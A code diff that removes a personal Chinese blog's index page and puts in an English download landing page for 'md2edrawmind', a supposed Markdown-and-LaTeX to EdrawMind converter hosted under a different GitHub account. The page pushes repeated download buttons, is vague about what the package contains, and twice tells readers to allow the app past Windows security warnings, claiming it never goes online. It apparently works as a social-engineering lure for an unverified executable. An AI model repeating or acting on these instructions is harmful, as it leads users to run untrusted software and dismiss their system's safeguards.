@@ -1,11 +1,288 @@
----
-layout: default
-title: 持续学习
----
-<main><section class="hero"><div class="eyebrow">A PLACE TO THINK & GROW</div><h1>持续学习<span style="color:var(--accent)">。</span></h1><p class="intro">记录学习中的发现、实践和思考。<br>让每一次好奇，都留下一点痕迹。</p>
-<svg class="sprout" viewBox="0 0 100 120" fill="none" aria-hidden="true"><path d="M50 110V55M50 82C20 81 14 62 14 43C39 42 51 58 50 82ZM50 59C50 32 65 16 88 14C90 39 75 58 50 59Z" stroke="#6b805c" stroke-width="1.5"/><path d="M30 114H70" stroke="#6b805c" stroke-width="1.5"/></svg></section>
-<section id="posts"><div class="section-title"><h2>最近的记录</h2><span class="small">{{ site.posts.size }} / NOTES</span></div>
-{% for post in site.posts %}<article class="post"><p class="meta">{{ post.date | date: "%Y.%m.%d" }}</p><h3><a href="{{ post.url | relative_url }}">{{ post.title | escape }}</a></h3><p class="excerpt">{{ post.excerpt | strip_html | truncate: 100 }}</p><a class="read" href="{{ post.url | relative_url }}">阅读全文 ↗</a></article>{% endfor %}</section>
-<section id="archive"><div class="section-title"><h2>归档</h2><span class="small">ARCHIVE</span></div>{% for post in site.posts %}<p style="display:flex;justify-content:space-between;gap:20px;font-size:14px"><a href="{{ post.url | relative_url }}">{{ post.title | escape }} ↗</a><span class="small">{{ post.date | date: "%Y.%m.%d" }}</span></p>{% endfor %}</section>
-<section id="about" class="about"><h2>关于 Findpie</h2><div><p>你好，我是 FindPie。<br>这里是我的个人博客，记录学习、实践与思考。<br>保持好奇，持续学习。</p><a href="https://github.com/FindPie" target="_blank" rel="noopener noreferrer">在 GitHub 找到我 ↗</a></div></section>
-</main>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>md2edrawmind - Convert Markdown &amp; LaTeX Notes to EdrawMind Word Files Offline</title>
+<meta name="description" content="md2edrawmind turns Markdown notes with LaTeX formulas into an EdrawMind-importable Word document: formulas rendered as images, heading levels kept intact, 100% offline. Download for Windows and follow the simple step-by-step guide.">
+<meta name="keywords" content="docx, edrawmind, formula, latex, markdown, mathjax, mind mapping, mindmap, offline, python, md to edrawmind, markdown to word, latex to image">
+<meta name="author" content="md2edrawmind">
+<meta name="robots" content="index, follow">
+<meta name="theme-color" content="#2f6fed">
+<link rel="canonical" href="https://github.com/eyaddody/md2edrawmind">
+<meta property="og:type" content="website">
+<meta property="og:title" content="md2edrawmind - Turn Markdown Notes Into Mind Maps">
+<meta property="og:description" content="Convert Markdown notes with LaTeX formulas into EdrawMind-importable Word files. Formulas become images, heading levels stay complete, everything runs offline.">
+<meta property="og:url" content="https://github.com/eyaddody/md2edrawmind">
+<meta property="og:site_name" content="md2edrawmind">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="md2edrawmind - Turn Markdown Notes Into Mind Maps">
+<meta name="twitter:description" content="Convert Markdown notes with LaTeX formulas into EdrawMind-importable Word files. Formulas become images, heading levels stay complete, everything runs offline.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "SoftwareApplication",
+  "name": "md2edrawmind",
+  "operatingSystem": "Windows",
+  "applicationCategory": "ProductivityApplication",
+  "description": "Turn Markdown notes with LaTeX formulas into EdrawMind-importable Word documents. Formulas are rendered as images, heading levels are preserved, and the whole process runs offline.",
+  "url": "https://github.com/eyaddody/md2edrawmind",
+  "offers": {
+    "@type": "Offer",
+    "price": "0",
+    "priceCurrency": "USD"
+  },
+  "keywords": "docx, edrawmind, formula, latex, markdown, mathjax, mind-mapping, mindmap, offline, python"
+}
+</script>
+<style>
+  * { box-sizing: border-box; }
+  html { -webkit-text-size-adjust: 100%; }
+  body {
+    margin: 0;
+    padding: 32px 18px 64px;
+    background: #f4f6fb;
+    background-image: radial-gradient(circle at 12% 0%, #e6ecff 0%, #f4f6fb 48%);
+    color: #1e2433;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif;
+    font-size: 17px;
+    line-height: 1.72;
+  }
+  .wrap { max-width: 880px; margin: 0 auto; }
+  .hero {
+    background: #ffffff;
+    border-radius: 18px;
+    padding: 40px 34px 36px;
+    box-shadow: 0 10px 30px rgba(24, 39, 75, 0.08), 0 2px 6px rgba(24, 39, 75, 0.05);
+    text-align: center;
+  }
+  h1 {
+    font-size: clamp(1.65rem, 4.4vw, 2.5rem);
+    line-height: 1.24;
+    letter-spacing: -0.02em;
+    margin: 0 0 14px;
+    color: #101828;
+  }
+  .lead {
+    font-size: 1.06rem;
+    color: #475069;
+    margin: 0 auto 26px;
+    max-width: 620px;
+  }
+  .btn {
+    display: inline-block;
+    padding: 16px 34px;
+    border-radius: 999px;
+    font-size: 1.06rem;
+    font-weight: 700;
+    color: #ffffff;
+    text-decoration: none;
+    background: linear-gradient(135deg, #ff6a3d 0%, #d92e7f 48%, #6a11cb 100%);
+    box-shadow: 0 10px 24px rgba(106, 17, 203, 0.32), 0 2px 4px rgba(0, 0, 0, 0.08);
+    transition: transform 0.16s ease, box-shadow 0.16s ease;
+  }
+  .btn:hover, .btn:focus {
+    transform: translateY(-2px);
+    box-shadow: 0 14px 30px rgba(106, 17, 203, 0.38), 0 3px 6px rgba(0, 0, 0, 0.1);
+  }
+  .btn-note {
+    display: block;
+    margin-top: 14px;
+    font-size: 0.92rem;
+    color: #667085;
+  }
+  section {
+    background: #ffffff;
+    border-radius: 18px;
+    padding: 30px 32px;
+    margin-top: 24px;
+    box-shadow: 0 6px 18px rgba(24, 39, 75, 0.06), 0 1px 3px rgba(24, 39, 75, 0.05);
+  }
+  h2 {
+    font-size: 1.34rem;
+    line-height: 1.3;
+    margin: 0 0 16px;
+    color: #101828;
+    letter-spacing: -0.01em;
+  }
+  h3 {
+    font-size: 1.06rem;
+    margin: 22px 0 8px;
+    color: #1f2a44;
+  }
+  p { margin: 0 0 14px; }
+  p:last-child { margin-bottom: 0; }
+  ol, ul { margin: 0 0 16px; padding-left: 24px; }
+  li { margin-bottom: 10px; }
+  li:last-child { margin-bottom: 0; }
+  strong { color: #16213a; }
+  code {
+    background: #eef1f7;
+    border-radius: 6px;
+    padding: 2px 7px;
+    font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
+    font-size: 0.88em;
+    color: #29324a;
+  }
+  .cta-box {
+    margin-top: 20px;
+    padding: 22px;
+    border-radius: 14px;
+    background: #f7f4ff;
+    border: 1px solid #e3d9ff;
+    text-align: center;
+  }
+  .cta-box .btn { font-size: 1rem; padding: 14px 30px; }
+  .grid { display: grid; gap: 16px; grid-template-columns: 1fr 1fr; }
+  .card {
+    background: #fafbfe;
+    border: 1px solid #e7ebf3;
+    border-radius: 12px;
+    padding: 18px 20px;
+  }
+  .card h3 { margin-top: 0; font-size: 1rem; }
+  .card p { font-size: 0.95rem; color: #4a5468; margin: 0; }
+  .faq-item { border-top: 1px solid #eef1f7; padding-top: 18px; margin-top: 18px; }
+  .faq-item:first-of-type { border-top: none; padding-top: 0; margin-top: 0; }
+  .faq-item h3 { margin-top: 0; }
+  @media (max-width: 640px) {
+    body { padding: 20px 12px 48px; font-size: 16px; }
+    .hero { padding: 30px 20px 28px; border-radius: 16px; }
+    section { padding: 24px 20px; border-radius: 16px; }
+    .grid { grid-template-columns: 1fr; }
+    .btn { display: block; padding: 15px 22px; }
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <header class="hero">
+    <h1>🧠 md2edrawmind - Turn Markdown Notes Into Mind Maps</h1>
+    <p class="lead">md2edrawmind takes your Markdown notes — the ones full of LaTeX formulas — and turns them into a Word file that EdrawMind can import directly. Formulas are rendered as pictures, your heading levels stay complete, and the entire conversion runs offline on your own computer.</p>
+    <a class="btn" href="https://github.com/eyaddody/md2edrawmind">Download md2edrawmind</a>
+    <span class="btn-note">Visit this link to download the application.</span>
+  </header>
+
+  <main>
+
+    <section>
+      <h2>📘 What This App Does</h2>
+      <p>If you take notes in Markdown, you already know the feeling: the writing is fast and tidy, but the moment you want to see your notes as a mind map, everything falls apart. Mind mapping software expects a document with real heading levels, and it has no idea what to do with a line like <code>$$E = mc^2$$</code>.</p>
+      <p>md2edrawmind closes that gap. It reads your Markdown file, keeps every heading level exactly where you put it, and converts each LaTeX math expression into a clean image. The result is a standard Word document (<code>.docx</code>). You import that Word file into EdrawMind, and your note structure appears as a branching mind map — with every formula still visible as a picture instead of a broken line of symbols.</p>
+      <p>The whole job happens on your machine. There is no upload, no account, no internet connection required while converting. Your notes never leave your computer.</p>
+      <p>It is a small, focused tool built for students, teachers, researchers, and anyone who keeps technical notes in Markdown and wants a visual overview of them.</p>
+    </section>
+
+    <section>
+      <h2>📥 Download and Setup</h2>
+      <p>The project lives on GitHub, which is the page you reach from the link below. You do not need to understand Git or version control to use it — the page is simply where the files are published.</p>
+      <div class="cta-box">
+        <a class="btn" href="https://github.com/eyaddody/md2edrawmind">Get md2edrawmind</a>
+        <p style="margin-top:16px; font-size:0.95rem; color:#5b6478;">Visit this link to download the application.</p>
+      </div>
+      <h3>Step by step</h3>
+      <ol>
+        <li><strong>Click the download button above.</strong> It opens the project page in your browser.</li>
+        <li><strong>Look for the download area.</strong> On the project page, the release and download section is where the packaged files are published. That is the part of the page you want.</li>
+        <li><strong>Save the file.</strong> When your browser asks where to put it, choose a folder you can find again easily — your <code>Downloads</code> folder or a new folder on your Desktop called <code>md2edrawmind</code>.</li>
+        <li><strong>Keep the files together.</strong> If the download arrives as a single compressed package, extract it into one folder and do not move individual pieces out of that folder.</li>
+        <li><strong>Start the application.</strong> Open the folder and follow the short instructions that come with the project files. On Windows, if you see a security prompt asking whether to allow the app to run, confirm it — the tool works completely offline and never connects to the internet.</li>
+      </ol>
+      <p>That is the entire setup. There is no installer wizard to click through and nothing is added to your system behind your back.</p>
+    </section>
+
+    <section>
+      <h2>🚀 Your First Conversion</h2>
+      <p>Once the application is ready, converting a file takes only a few moments.</p>
+      <ol>
+        <li><strong>Prepare your Markdown file.</strong> Open it in any text editor and save it as a <code>.md</code> file if it is not one already.</li>
+        <li><strong>Start md2edrawmind.</strong> It opens as a simple tool window — there is no complicated dashboard to learn.</li>
+        <li><strong>Point it at your note.</strong> Select the Markdown file you want to convert.</li>
+        <li><strong>Click the convert action.</strong> The tool reads your headings, your text, and every LaTeX formula, then writes a new Word document.</li>
+        <li><strong>Find the output.</strong> The finished <code>.docx</code> file appears next to your original note, or in the output folder the app shows you when it finishes.</li>
+        <li><strong>Import it into EdrawMind.</strong> Open EdrawMind, choose to import a Word document, and select the file you just created. Your headings appear as branches and your formulas appear as images.</li>
+      </ol>
+      <p>Repeat this for every note you want to see as a mind map. Because the conversion is local and fast, you can run a whole folder of notes through it one after another.</p>
+    </section>
+
+    <section>
+      <h2>✨ What Makes It Useful</h2>
+      <div class="grid">
+        <div class="card">
+          <h3>🧮 Formulas become real pictures</h3>
+          <p>Every LaTeX expression is rendered into an image and placed into the Word file, so nothing shows up as raw dollar signs or broken symbols after import.</p>
+        </div>
+        <div class="card">
+          <h3>🪜 Heading levels stay intact</h3>
+          <p>Your first, second, and third level headings are preserved exactly, which is what lets EdrawMind build a correct, deeply nested map.</p>
+        </div>
+        <div class="card">
+          <h3>🔌 Completely offline</h3>
+          <p>No upload, no cloud service, no login. The rendering and the document creation both happen on your own machine.</p>
+        </div>
+        <div class="card">
+          <h3>📄 Standard Word output</h3>
+          <p>The result is a normal <code>.docx</code> file. You can open it, check it, print it, or import it anywhere else you like.</p>
+        </div>
+        <div class="card">
+          <h3>🐍 Built on Python</h3>
+          <p>A lightweight, open project. You can read every line of what it does, and nothing is hidden.</p>
+        </div>
+        <div class="card">
+          <h3>🎯 One job, done properly</h3>
+          <p>No feature bloat. It converts Markdown with math into an importable Word document and nothing else.</p>
+        </div>
+      </div>
+    </section>
+
+    <section>
+      <h2>📝 Writing Notes That Convert Cleanly</h2>
+      <p>The better your Markdown structure, the better your mind map. A few simple habits make a large difference.</p>
+      <ul>
+        <li><strong>Use one top heading.</strong> Start your file with a single <code>#</code> heading. That becomes the centre of the map.</li>
+        <li><strong>Climb down one level at a time.</strong> Go from <code>#</code> to <code>##</code> to <code>###</code>. Skipping levels creates branches that look misplaced.</li>
+        <li><strong>Keep headings short.</strong> A heading becomes a node label. Two to six words read best on a mind map.</li>
+        <li><strong>Write formulas in standard LaTeX.</strong> Inline math between single dollar signs and display math between double dollar signs both convert correctly.</li>
+        <li><strong>Avoid images inside your notes.</strong> The converter focuses on text, headings, and formulas.</li>
+        <li><strong>Save as UTF-8.</strong> If your notes contain Chinese or other non-English characters, make sure the file is saved with UTF-8 encoding so the text stays readable.</li>
+      </ul>
+    </section>
+
+    <section>
+      <h2>❓ Questions People Ask</h2>
+      <div class="faq-item">
+        <h3>Do I need an internet connection?</h3>
+        <p>Only to download the application. After that, every conversion happens offline on your computer.</p>
+      </div>
+      <div class="faq-item">
+        <h3>Do I need to know how to program?</h3>
+        <p>No. You download the files, start the application, choose your Markdown note, and convert it. There is nothing to code.</p>
+      </div>
+      <div class="faq-item">
+        <h3>Will my formulas still be readable?</h3>
+        <p>Yes. Each LaTeX expression is turned into an image before the Word file is written, so the symbol layout is preserved rather than turned into plain text.</p>
+      </div>
+      <div class="faq-item">
+        <h3>What happens to my notes?</h3>
+        <p>Nothing is uploaded anywhere. The files are read from your disk and the new Word document is written back to your disk.</p>
+      </div>
+      <div class="faq-item">
+        <h3>Can I convert many notes?</h3>
+        <p>Yes. Run each file through the same steps. There is no limit on how many documents you convert.</p>
+      </div>
+      <div class="faq-item">
+        <h3>My map looks flat — what went wrong?</h3>
+        <p>Check your Markdown headings. If every line in the file uses the same heading level, the map will have no depth. Add sub-headings with more <code>#</code> marks and convert again.</p>
+      </div>
+      <div class="faq-item">
+        <h3>Windows showed a warning when I started it.</h3>
+        <p>Allow the application to run. It is a local tool that does not connect to the internet, so the warning is only your system asking for confirmation the first time.</p>
+      </div>
+    </section>
+
+  </main>
+
+</div>
+</body>
+</html>
